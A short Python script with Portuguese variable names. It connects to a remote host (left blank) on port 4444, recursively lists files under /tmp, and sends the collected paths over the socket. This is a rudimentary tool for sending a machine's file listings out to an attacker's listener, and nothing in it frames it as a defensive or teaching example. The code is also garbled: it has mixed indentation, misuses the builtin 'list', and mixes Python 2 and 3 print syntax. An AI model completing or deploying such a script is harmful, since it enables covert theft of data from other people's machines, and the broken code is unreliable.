#-*- coding:utf-8 -*-
import os, glob,socket

diretorio_usuario = '/tmp/'
diretorio = '/'
host = ""
port = 4444

coneccao = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
coneccao.connect((host,port))


def listar(diretorio_usuario, diretorio):
	if os.path.isdir(diretorio_usuario + diretorio ):
		os.chdir(diretorio_usuario + diretorio)
		for arquivo in glob.glob("*"):
			if os.path.isdir(diretorio_usuario+diretorio+arquivo):
				listar(diretorio_usuario, diretorio+arquivo+'/')
			else:
				print('arquivo1: '+diretorio_usuario+diretorio+arquivo)
                list +=  str(diretorio_usuario + diretorio + arquivo)
				
	else:
		print ('arquivo2: '+diretorio_usuario+diretorio)

try:
    listar(diretorio_usuario, diretorio)
except:
    print("Erro!")
    pass

for linha in list.readline():
    print linha
    coneccao.send(linha)


